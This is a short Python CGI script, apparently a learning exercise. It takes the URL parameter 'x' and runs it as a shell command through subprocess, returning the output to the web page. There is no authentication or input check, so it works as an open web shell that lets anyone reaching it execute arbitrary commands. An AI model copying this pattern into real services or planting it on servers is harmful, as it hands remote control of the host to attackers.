#!/usr/bin/python3

print("content-type:text/html")
print()

import subprocess as sp
import cgi

field = cgi.FieldStorage()
task = field.getvalue("x")
output = sp.getoutput(task)
print(output)
#print(ouput[1])
